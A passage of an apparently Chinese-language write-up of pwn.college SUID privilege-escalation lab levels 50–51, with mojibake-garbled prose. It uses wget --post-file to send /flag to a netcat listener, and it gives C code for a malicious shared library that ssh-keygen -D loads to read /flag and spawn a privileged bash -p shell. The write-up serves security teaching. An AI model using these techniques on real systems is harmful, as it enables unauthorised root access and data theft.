       --ca-certificate<span class="token operator">=</span>FILE       <span class="token function">file</span> with the bundle of CAs
       --crl-file<span class="token operator">=</span>FILE             <span class="token function">file</span> with bundle of CRLs
       <span class="token parameter variable">--pinnedpubkey</span><span class="token operator">=</span>FILE/HASHES  Public key <span class="token punctuation">(</span>PEM/DER<span class="token punctuation">)</span> file, or any number
       --random-file<span class="token operator">=</span>FILE          <span class="token function">file</span> with random data <span class="token keyword">for</span> seeding the SSL PRNG
       --warc-file<span class="token operator">=</span>FILENAME        save request/response data to a .warc.gz <span class="token function">file</span>
       --warc-dedup<span class="token operator">=</span>FILENAME       <span class="token keyword">do</span> not store records listed <span class="token keyword">in</span> this CDX <span class="token function">file</span>
hacker@program-misuse~level50:/challenge$ <span class="token function">wget</span> <span class="token parameter variable">--help</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token function">file</span>
Logging and input file:
  -o,  --output-file<span class="token operator">=</span>FILE          log messages to FILE
  -i,  --input-file<span class="token operator">=</span>FILE           download URLs found <span class="token keyword">in</span> <span class="token builtin class-name">local</span> or external FILE
  -F,  --force-html                treat input <span class="token function">file</span> as HTML
  -B,  <span class="token parameter variable">--base</span><span class="token operator">=</span>URL                  resolves HTML input-file links <span class="token punctuation">(</span>-i -F<span class="token punctuation">)</span>
       <span class="token parameter variable">--config</span><span class="token operator">=</span>FILE               specify config <span class="token function">file</span> to use
       --no-config                 <span class="token keyword">do</span> not <span class="token builtin class-name">read</span> any config <span class="token function">file</span>
                                     existing files <span class="token punctuation">(</span>overwriting them<span class="token punctuation">)</span>
  -c,  <span class="token parameter variable">--continue</span>                  resume getting a partially-downloaded <span class="token function">file</span>
  -N,  <span class="token parameter variable">--timestamping</span>              don<span class="token string">'t re-retrieve files unless newer than
       --no-use-server-timestamps  don'</span>t <span class="token builtin class-name">set</span> the <span class="token builtin class-name">local</span> <span class="token function">file</span><span class="token string">'s timestamp by
       --restrict-file-names=OS    restrict chars in file names to ones OS allows
       --ignore-case               ignore case when matching files/directories
       --unlink                    remove file before clobber
       --xattr                     turn on storage of metadata in extended file attributes
  -P,  --directory-prefix=PREFIX   save files to PREFIX/..
       --save-headers              save the HTTP headers to file
       --post-file=FILE            use the POST method; send contents of FILE
       --body-file=FILE            send contents of FILE. --method MUST be set
                                     choosing local file names (EXPERIMENTAL)
       --certificate=FILE          client certificate file
       --private-key=FILE          private key file
       --ca-certificate=FILE       file with the bundle of CAs
       --crl-file=FILE             file with bundle of CRLs
       --pinnedpubkey=FILE/HASHES  Public key (PEM/DER) file, or any number
       --random-file=FILE          file with random data for seeding the SSL PRNG
       --hsts-file                 path of HSTS database (will override default)
       --no-remove-listing         don'</span>t remove <span class="token string">'.listing'</span> files
       --no-glob                   turn off FTP <span class="token function">file</span> name globbing
       --preserve-permissions      preserve remote <span class="token function">file</span> permissions
       --retr-symlinks             when recursing, get linked-to files <span class="token punctuation">(</span>not <span class="token function">dir</span><span class="token punctuation">)</span>
       --warc-file<span class="token operator">=</span>FILENAME        save request/response data to a .warc.gz <span class="token function">file</span>
       --warc-max-size<span class="token operator">=</span>NUMBER      <span class="token builtin class-name">set</span> maximum size of WARC files to NUMBER
       --warc-cdx                  <span class="token function">write</span> CDX index files
       --warc-dedup<span class="token operator">=</span>FILENAME       <span class="token keyword">do</span> not store records listed <span class="token keyword">in</span> this CDX <span class="token function">file</span>
       --no-warc-compression       <span class="token keyword">do</span> not compress WARC files with GZIP
       --no-warc-keep-log          <span class="token keyword">do</span> not store the log <span class="token function">file</span> <span class="token keyword">in</span> a WARC record
       --warc-tempdir<span class="token operator">=</span>DIRECTORY    location <span class="token keyword">for</span> temporary files created by the
       --delete-after              delete files locally after downloading them
                                     <span class="token builtin class-name">local</span> files
       --convert-file-only         convert the <span class="token function">file</span> part of the URLs only <span class="token punctuation">(</span>usually known as the <span class="token function">basename</span><span class="token punctuation">)</span>
       <span class="token parameter variable">--backups</span><span class="token operator">=</span>N                 before writing <span class="token function">file</span> X, rotate up to N backup files
  -K,  --backup-converted          before converting <span class="token function">file</span> X, back up as X.orig
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÂèØ‰ª•Âà©Áî®ÂÆÉÁöÑÊñá‰ª∂‰∏ä‰º†ÂäüËÉΩÊù•ËøõË°åËØªÂèñÊñá‰ª∂ÁöÑÂéüÊú¨ÂÜÖÂÆπÔºåÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lp 8888 &amp; wget --post-file&#x3D;&#x2F;flag http:&#x2F;&#x2F;127.0.0.1:8888  &#x2F;&#x2F;ÁõëÂê¨Êú¨Âú∞8888Á´ØÂè£ÔºåÂπ∂‰∏îÁî®wget‰∏ä‰º†&#x2F;flagÂà∞Êú¨Âú∞8888Á´ØÂè£<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>nc</code> ÊòØ‰∏Ä‰∏™ÂäüËÉΩÂº∫Â§ßÁöÑÁΩëÁªúÂ∑•ÂÖ∑ÔºåÂ∏∏Áî®‰∫éÂàõÂª∫ TCP Êàñ UDP ËøûÊé•ÔºåÂèëÈÄÅÊàñÊé•Êî∂Êï∞ÊçÆÔºåÊâßË°åÁ´ØÂè£Êâ´ÊèèÁ≠âÊìç‰Ωú„ÄÇ‰ª•‰∏ãÊòØ <code>nc</code> Â∏∏Áî®ÁöÑÂëΩ‰ª§ÂíåÂèÇÊï∞Ôºö</p>
<h4 id="Â∏∏Áî®ÂëΩ‰ª§"><a class="markdownIt-Anchor" href="#Â∏∏Áî®ÂëΩ‰ª§"></a> Â∏∏Áî®ÂëΩ‰ª§Ôºö</h4>
<ol>
<li>
<p><strong>ÁõëÂê¨Ê®°Âºè</strong>ÔºöÁî®‰∫éÂêØÂä®‰∏Ä‰∏™ÊúçÂä°Âô®‰ª•ÁõëÂê¨ËøûÊé•ËØ∑Ê±Ç„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">nc -l &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ËøûÊé•Âà∞ËøúÁ®ã‰∏ªÊú∫ÂíåÁ´ØÂè£</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">nc &lt;hostname&#x2F;IP&gt; &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>‰ªéÊ†áÂáÜËæìÂÖ•ÂèëÈÄÅÊï∞ÊçÆ</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">nc &lt;hostname&#x2F;IP&gt; &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>‰ªéÊñá‰ª∂ÂèëÈÄÅÊï∞ÊçÆ</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">nc &lt;hostname&#x2F;IP&gt; &lt;port&gt; &lt; file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÂèëÈÄÅÊï∞ÊçÆÂπ∂Êé•Êî∂ÂõûÂ§ç</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">nc -z &lt;hostname&#x2F;IP&gt; &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h4 id="Â∏∏Áî®ÂèÇÊï∞"><a class="markdownIt-Anchor" href="#Â∏∏Áî®ÂèÇÊï∞"></a> Â∏∏Áî®ÂèÇÊï∞Ôºö</h4>
<ol>
<li><code>-l</code>ÔºöÁõëÂê¨Ê®°Âºè„ÄÇ</li>
<li><code>-p &lt;port&gt;</code>ÔºöÊåáÂÆöÊú¨Âú∞Á´ØÂè£Âè∑„ÄÇ</li>
<li><code>-e &lt;command&gt;</code>ÔºöÊåáÂÆöÂú®Âª∫Á´ãËøûÊé•ÂêéÊâßË°åÁöÑÂëΩ‰ª§„ÄÇ</li>
<li><code>-u</code>Ôºö‰ΩøÁî® UDP ÂçèËÆÆ„ÄÇ</li>
<li><code>-t</code>Ôºö‰ΩøÁî® TCP ÂçèËÆÆÔºàÈªòËÆ§Ôºâ„ÄÇ</li>
<li><code>-v</code>ÔºöÊòæÁ§∫ËØ¶ÁªÜ‰ø°ÊÅØ„ÄÇ</li>
<li><code>-w &lt;timeout&gt;</code>ÔºöËÆæÁΩÆË∂ÖÊó∂Êó∂Èó¥„ÄÇ</li>
<li><code>-i &lt;interval&gt;</code>ÔºöËÆæÁΩÆÂèëÈÄÅÊï∞ÊçÆÂåÖÁöÑÈó¥ÈöîÊó∂Èó¥„ÄÇ</li>
<li><code>-s &lt;source&gt;</code>ÔºöËÆæÁΩÆÊú¨Âú∞Ê∫êÂú∞ÂùÄ„ÄÇ</li>
<li><code>-z</code>ÔºöËøõË°åÁ´ØÂè£Êâ´ÊèèÔºå‰ΩÜ‰∏çÂª∫Á´ãËøûÊé•„ÄÇ</li>
<li><code>-k</code>Ôºö‰øùÊåÅËøûÊé•ÔºåÊåÅÁª≠ÁõëÂê¨‰º†ÂÖ•ÁöÑËøûÊé•„ÄÇ</li>
<li><code>-d</code>ÔºöÂêØÁî®Ë∞ÉËØïÊ®°Âºè„ÄÇ</li>
<li><code>-h</code> Êàñ <code>--help</code>ÔºöÊòæÁ§∫Â∏ÆÂä©‰ø°ÊÅØ„ÄÇ</li>
</ol>
<p>Ëøô‰∫õÂëΩ‰ª§ÂíåÂèÇÊï∞ÂèØ‰ª•Ê†πÊçÆÂÖ∑‰ΩìÁöÑÈúÄÊ±ÇÁªÑÂêà‰ΩøÁî®ÔºåÂ∏ÆÂä©ÂÆûÁé∞ÂêÑÁßçÁΩëÁªúË∞ÉËØï„ÄÅÊé¢ÊµãÂíå‰º†Ëæì‰ªªÂä°„ÄÇ</p>
<h3 id="level51ssh-keygen"><a class="markdownIt-Anchor" href="#level51ssh-keygen"></a> level51(ssh-keygen)</h3>
<p>Ê†πÊçÆËøô‰∏ÄÂÖ≥Âç°ÁöÑÊèèËø∞ÔºåÈ¢òÁõÆÂ§ßËá¥ÊòØË¶ÅÊ±ÇÊàë‰ª¨Âä†ËΩΩ‰∏ÄÊÆµËá™Â∑±ÂÜôÁöÑ‰ª£Á†ÅÔºåÈòÖËØª<code>ssh-keygen</code>ÁöÑ<code>man</code>ÊñáÊ°£ ,ÂèØ‰ª•ÂèëÁé∞ssh-keygenÂèØ‰ª•Âä†ËΩΩ‰∏Ä‰∏™ÂêçÂè´<code>pkcs11</code>ÁöÑÂ∫ìÊñá‰ª∂,Ëøô‰∏™Â∫ìÁöÑÂêçÂ≠óÊòØ<code>shared library</code>ÔºåÂõ†Ê≠§ÊòØ‰∏Ä‰∏™</p>
<p><code>dynamic link library</code>,Êàë‰ª¨Ë¶ÅÂ∞ÜÊàë‰ª¨ÁöÑ‰ª£Á†ÅÂä†ËΩΩËøõÂéªÔºåÂ∞±ÂøÖÈ°ªÂàõÂª∫‰∏Ä‰∏™dll</p>
<p><code>gcc -shared -o libexample.so example.c</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse-level-51:~$ <span class="token function">touch</span> test.c
hacker@program-misuse-level-51:~$ gcc <span class="token parameter variable">-c</span> <span class="token parameter variable">-fPIC</span> test.c <span class="token parameter variable">-o</span> test.o
hacker@program-misuse-level-51:~$ <span class="token function">ls</span>
Desktop  demo  key  key.pub  test.c  test.o
hacker@program-misuse-level-51:~$ gcc <span class="token parameter variable">-shared</span> test.o <span class="token parameter variable">-o</span> test.so
hacker@program-misuse-level-51:~$ <span class="token function">ls</span>
Desktop  demo  key  key.pub  test.c  test.o  test.so
hacker@program-misuse-level-51:~$ ssh-keygen <span class="token parameter variable">-D</span> ./test.so 
./test.so does not contain expected string C_GetFunctionList
provider ./test.so is not a PKCS11 library
cannot <span class="token builtin class-name">read</span> public key from pkcs11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Ê†πÊçÆÊä•Èîô‰ø°ÊÅØÔºåÊàë‰ª¨ÈúÄË¶ÅÂú®Ëøô‰∏™dll‰∏≠Êúâ‰∏Ä‰∏™<code>C_GetFunctionList</code></p>
<p>ÈÇ£‰πàÊîπÂÜôÊàë‰ª¨ÁöÑc‰ª£Á†Å</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">C_GetFunctionList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

FILE<span class="token operator">*</span> fp<span class="token punctuation">;</span>
fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level51:~/demo$ ssh-keygen <span class="token parameter variable">-D</span> ./level51.so 
Hello World
pwn.college<span class="token punctuation">&#123;</span>URDrFXWtQjHXjtkQO4hH4oWCj6X.01M5EDLzczN0UzW<span class="token punctuation">&#125;</span>
Segmentation fault<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<hr />
<p>ÂÆòÊñπÊïôÂ≠¶</p>
<p>Áü•ËØÜÁÇπÔºö</p>
<ol>
<li>
<p>È¶ñÂÖàÊòØssh-keygenÁî®-DÂèÇÊï∞ÂèØ‰ª•Áõ¥Êé•ËøêË°å‰ªªÊÑèÁöÑÂÖ±‰∫´Â∫ìÔºåÂ¶ÇÊûúÊúâsuidÁöÑËØùÂ∞±ËÉΩËøêË°åÊàë‰ª¨ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÈÄ†ÊàêÊèêÊùÉÔºåÂÖ±‰∫´Â∫ìÁöÑÂàõÂª∫ÊñπÂºèËßÅ‰∏ãÊñπ„ÄÇ</p>
<p>‰ΩøÁî®ÊñπÊ≥ïÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">ssh-keygen -D .&#x2F;su.os<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ÂèØ‰ª•Âà©Áî®cËØ≠Ë®Ä‰ª£Á†ÅÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">sendfile(1,open(&quot;&#x2F;flag&quot;,0),0,4096);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Êù•ÊâìÂºÄÊñá‰ª∂ÔºåÂπ∂‰∏îÂ∞ÜÂÜÖÂÆπÂèëÈÄÅÁªôÊ†áÂáÜËæìÂá∫ÊòæÁ§∫„ÄÇ</p>
</li>
<li>
<p>ÂèØ‰ª•Âà©Áî®ËÆæÁΩÆcËØ≠Ë®ÄÁöÑattributeÂ±ûÊÄßÊù•‰ΩøÂáΩÊï∞Âú®Á®ãÂ∫èÈ¢ÑÂ§ÑÁêÜÈò∂ÊÆµËøêË°åÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
static void inject() __attribute__((constructor));
void inject()&#123;
printf(&quot;euid:%d\n&quot;,geteuid());
sendfile(1,open(&quot;&#x2F;flag&quot;,0),0,4096);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>cÁ®ãÂ∫èÁöÑÈìæÊé•ÊñπÂºèÂåÖÊã¨<strong>ÈùôÊÄÅÈìæÊé•</strong>Âíå<strong>Âä®ÊÄÅÈìæÊé•</strong>‰∏§Áßç„ÄÇ</p>
<p><strong>ÈùôÊÄÅÈìæÊé•Â∫ì</strong>ÔºåÂú®‰ª•ÂâçÔºåÁ®ãÂ∫èÊòØÁã¨Á´ãÁöÑÔºåÁºñ‰∏™Á®ãÂ∫èË¶Å‰ªéÂ§¥Âà∞Â∞æËá™Â∑±ËÄÉËôë„ÄÇÂêéÊù•‰∏∫‰∫ÜÊñπ‰æøÔºåÊääÈÄöÁî®ÁöÑÁ®ãÂ∫èÊîæÂú®‰∏ÄËµ∑ÔºåËøôÂ∞±ÊòØÂ∫ìÔºåÈÅáÂà∞ÈúÄË¶ÅÁ±ª‰ººÁöÑÂäüËÉΩÂ∞±ÂèØ‰ª•Ë∞ÉÁî®„ÄÇ‰ΩÜÊòØËøô‰∏™Êúâ‰∏™ÈóÆÈ¢òÔºåËÆ°ÁÆóÊú∫‰∏çÁü•ÈÅì‰Ω†Ë¶ÅÁî®ÁöÑÊòØÈìæÊé•Â∫ìÂì™‰∏Ä‰∏™Á®ãÂ∫èÔºå ÊâÄ‰ª•ÂÆÉ‰∏çÂæó‰∏çÂ∞ÜÈìæÊé•Â∫ìÂÖ®ÈÉ®Á®ãÂ∫èÂåÖÂê´ËøõÊù•Ôºå‰ΩøÂæóÁ®ãÂ∫èÂæàÂ§ß„ÄÇ <strong>Âä®ÊÄÅÈìæÊé•Â∫ì</strong>ÔºåÊú¨Ë∫´ÂíåÈùôÊÄÅÈìæÊé•Ê≤°‰ªÄ‰πàÂå∫Âà´Ôºå‰πüÊòØÊääÈÄöÁî®‰ª£Á†ÅÂÜôËøõ‰∏Ä‰∫õÁã¨Á´ãÊñá‰ª∂ÈáåÔºå‰ΩÜÊòØÂú®ÁºñËØëÊñπÈù¢ÔºåÂæÆËΩØÁªï‰∫Ü‰∏™ÂúàÂ≠êÔºåÂπ∂Ê≤°ÊúâÈááÂèñÊääÂ∫ìÊñá‰ª∂Âä†ËøõÁ®ãÂ∫èÁöÑÊñπÊ≥ïÔºåËÄåÊòØÊääÂ∫ìÊñá‰ª∂ÂÅöÊàêÂ∑≤ÁªèÁºñËØëÂ•ΩÁöÑÁ®ãÂ∫èÔºåÁªôÂÆÉ‰ª¨ÂºÄ‰∏™‰∫§Êç¢Êï∞ÊçÆÁöÑÊé•Âè£ÔºåÂÜôÁ®ãÂ∫èÁöÑÊó∂ÂÄôÔºå‰∏ÄÊó¶Ë¶Å‰ΩøÁî®Êüê‰∏™Â∫ìÊñá‰ª∂ÁöÑ‰∏Ä‰∏™ÂäüËÉΩÂáΩÊï∞ÔºåÁ≥ªÁªüÂ∞±ÊääËøô‰∏™Â∫ìÊñá‰ª∂Ë∞ÉÂÖ•ÂÜÖÂ≠òÔºåËøûÊé•‰∏äËøô‰∏™Á®ãÂ∫èÂç†ÊúâÁöÑ‰ªªÂä°ËøõÁ®ãÔºåÁÑ∂ÂêéÊâßË°åÁ®ãÂ∫èË¶ÅÁî®ÁöÑÂäüËÉΩÂáΩÊï∞ÔºåÂπ∂ÊääÁªìÊûúËøîÂõûÁªôÁ®ãÂ∫èÊòæÁ§∫Âá∫Êù•ÔºåÂú®Êàë‰ª¨ÁúãÊù•ÔºåÂ∞±ÂÉèÊòØÁ®ãÂ∫èËá™Â∑±Â∏¶ÊúâÁöÑÂäüËÉΩ‰∏ÄÊ†∑„ÄÇ ÂÆåÊàêÈúÄË¶ÅÁöÑÂäüËÉΩÂêéÔºåËøô‰∏™DLLÂÅúÊ≠¢ËøêË°åÔºåÊï¥‰∏™Ë∞ÉÁî®ËøáÁ®ãÁªìÊùü„ÄÇ DLLÊòØÁºñËØëÂ•ΩÁöÑ‰ª£Á†ÅÔºå‰∏é‰∏ÄËà¨Á®ãÂ∫èÊ≤°‰ªÄ‰πàÂ§ßÂ∑ÆÂà´ÔºåÂè™ÊòØÂÆÉ‰∏çËÉΩÁã¨Á´ãËøêË°åÔºåÈúÄË¶ÅÁ®ãÂ∫èË∞ÉÁî®„ÄÇDLLÁöÑ‰ª£Á†ÅÂíåÂÖ∂‰ªñÁ®ãÂ∫èÂá†Âπ≥Ê≤°‰ªÄ‰πà‰∏§Ê†∑Ôºå‰ªÖ‰ªÖÊòØÊé•Âè£ÂíåÂêØÂä®Ê®°Âºè‰∏çÂêå„ÄÇ</p>
</li>
<li>
<p>gccÂèØ‰ª•ÈÄöËøá<code>-shared</code>ÂèÇÊï∞Êù•ÂàõÂª∫ÂÖ±‰∫´Â∫ìÔºåÂÖ±‰∫´Â∫ì‰∏çËÉΩÂçïÁã¨ËøêË°åÔºåÂÆÉÁõ∏ÂΩì‰∫é‰∏Ä‰∏™ÂøÖÈ°ªË¢´Âà´‰∫∫Ë∞ÉÁî®ÊâçËÉΩËøêË°åÁöÑÁ®ãÂ∫èÔºåÂÆÉ‰∏éÊôÆÈÄö‰∫åËøõÂà∂Á®ãÂ∫èÁöÑÂå∫Âà´ÂèØ‰ª•ÈÄöËøáfileÂëΩ‰ª§Êù•Êü•ÁúãÔºåÂÖ±‰∫´Â∫ìÊ≤°Êúâ<code>interpreter</code>ËøôÊ†∑ÁöÑÂ≠óÊÆµÔºå‰πüÂ∞±ÊòØÊ≤°ÊúâÈìæÊé•Ëß£ÈáäÂô®„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">gcc 51.c -shared -o su.os<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>cÁ®ãÂ∫è‰∏≠ÂèØ‰ª•Âà©Áî®&lt;dlfcn.h&gt;Â§¥Êñá‰ª∂‰∏≠ÁöÑ‰∏ÄÁ≥ªÂàóÂáΩÊï∞dlopenÔºådlcloseÊù•Âä†ËΩΩËøêË°åÂÖ±‰∫´Â∫ìÔºåËØ¶ÁªÜËØ¥ÊòéÂèØ‰ª•ÈÄöËøáÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">man dlopen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Êù•Êü•Áúã„ÄÇ</p>
</li>
<li>
<p>lddÂëΩ‰ª§ Áî®‰∫éÊâìÂç∞Á®ãÂ∫èÊàñËÄÖÂ∫ìÊñá‰ª∂ÊâÄ‰æùËµñÁöÑÂÖ±‰∫´Â∫ìÂàóË°®„ÄÇÊàë‰ª¨ÂèØ‰ª•Âà©Áî®ÂÆÉÊù•Êü•ÁúãÊòØÂê¶ÊúâÂèØÊìç‰ΩúÁöÑosÂÖ±‰∫´Â∫ìÔºåÊ≥®ÂÖ•Êàë‰ª¨ÁöÑ‰ª£Á†Å„ÄÇ</p>
</li>
<li>
<p>Âè¶Â§ñ‰∏ÄÁßçÊü•ËØ¢ÊñπÂºèÊòØÂà©Áî®straceÊù•Êü•ÁúãÁ®ãÂ∫èËøêË°åÂÖ®Á®ãÔºåÁÑ∂ÂêéÂèØ‰ª•Áî®grepÊù•ËøáÊª§‰∏Ä‰∏ãÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">strace &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-so 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>ÁºñÂÜô51.cÔºö</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
static void inject() __attribute__((constructor));
void C_GetFunctionList()&#123;
printf(&quot;euid:%d\n&quot;,geteuid());
sendfile(1,open(&quot;&#x2F;flag&quot;,0),0,4096);
&#x2F;&#x2F;system(&quot;cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash &amp;&amp; chmod +s &#x2F;tmp&#x2F;bash &amp;&amp; &#x2F;tmp&#x2F;bash -p&quot;);
char *argvv[]&#x3D;&#123;&quot;bash&quot;,&quot;-p&quot;,NULL&#125;;
execvp(&quot;&#x2F;bin&#x2F;bash&quot;,argvv);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÁºñËØëÂêéÁî®ssh-keygenÁöÑ-DÂèÇÊï∞ËøêË°åÂç≥ÂèØÔºö</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token number">51</span>.c <span class="token parameter variable">-shared</span> <span class="token parameter variable">-o</span> su.os
/challenge/babysuid_level51
ssh-keygen <span class="token parameter variable">-D</span> ./su.os<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="ÊÄªÁªì"><a class="markdownIt-Anchor" href="#ÊÄªÁªì"></a> ÊÄªÁªìÔºö</h3>
<p>Êú¨Â∞èËäÇÊòØSUIDÊèêÊùÉÔºåÂèØ‰ª•ËÆ©Êú¨Ê≤°ÊúâÁõ∏Â∫îÊùÉÈôêÁöÑÁî®Êà∑ÔºåËÆøÈóÆÂÆÉÊ≤°ÊúâÊùÉÈôêËÆøÈóÆÁöÑÁ®ãÂ∫è</p>
<hr />
<blockquote>
<p>level1~6   Â∏∏Áî®ÁöÑËØªÂèñÊñá‰ª∂ÂÜÖÂÆπÁöÑÂëΩ‰ª§‰æùÊ¨°‰∏∫Ôºöcat„ÄÅmore„ÄÅless„ÄÅtail„ÄÅhead„ÄÅsort„ÄÅrev</p>
<p>level7~9 Â∏∏ËßÅÁöÑÊñáÊú¨ÁºñËæëÂô® ‰æùÊ¨°‰∏∫Ôºövim„ÄÅemacs„ÄÅnano</p>
<p>11~13Ôºö<strong>Â∏∏ËßÅÁöÑ16ËøõÂà∂ËØªÂèñÂëΩ‰ª§</strong>Ôºå‰æùÊ¨°‰∏∫Ôºöod„ÄÅhexdump(hd)„ÄÅxxd</p>
<p>level14~15 baseÁ≥ªÂàóÁºñÁ†ÅÂëΩ‰ª§‰æùÊ¨°‰∏∫Ôºöbase32„ÄÅbase64</p>
<p>16Ôºö<strong>ÂàÜÂâ≤Êñá‰ª∂ÂëΩ‰ª§</strong>Ôºå‰∏∫Ôºösplite</p>
<p>17~23Ôºö<strong>Â∏∏ËßÅÂéãÁº©Ëß£ÂéãÁº©ÂëΩ‰ª§</strong>Ôºå‰æùÊ¨°‰∏∫Ôºögzip„ÄÅbzip2„ÄÅzip„ÄÅtar„ÄÅar„ÄÅcpio„ÄÅgenisoimage</p>
<p>24~31Ôºö<strong>ÂèØÊâßË°åÂëΩ‰ª§ÁöÑÂ∏∏ËßÅÂëΩ‰ª§</strong>Ôºå‰æùÊ¨°‰∏∫Ôºöenv„ÄÅfind„ÄÅmake„ÄÅnice„ÄÅtimeout„ÄÅstdbuf„ÄÅsetarch„ÄÅwatch</p>
<p>32Ôºö<strong>Â∏∏ËßÅÁΩëÁªúËøûÊé•Â∑•ÂÖ∑</strong>Ôºå‰∏∫Ôºösocat</p>
<p>33Ôºö<strong>ËÑöÊú¨ÂØπËØùÊ°ÜÂ∑•ÂÖ∑</strong>Ôºå‰∏∫Ôºöwhiptail</p>
<p>34~36Ôºö<strong>ÊµÅÂºèÊñáÊú¨ÁºñËæëÂô®</strong>Ôºå‰∏∫Ôºöawk„ÄÅsed„ÄÅed</p>
<p>37~38Ôºö<strong>‰øÆÊîπÊñá‰ª∂ÂΩíÂ±ûËÄÖÊàñÊùÉÈôê</strong>Ôºå‰∏∫Ôºöchown„ÄÅchmod</p>
<p>39~40Ôºö<strong>Â∏∏ËßÅÁßªÂä®Êñá‰ª∂ÂëΩ‰ª§</strong>Ôºåcp„ÄÅmv</p>
<p>41~44ÔºöËÑöÊú¨Ëß£ÈáäÂô® perl python ruby bash</p>
<p>45~50 ÂÖ∂‰ªñÂèØËØªÂèñÊñá‰ª∂ÁöÑÂëΩ‰ª§ date,dmesg wc gcc as wget</p>
<p>51  ssh-keygen</p>
</blockquote>
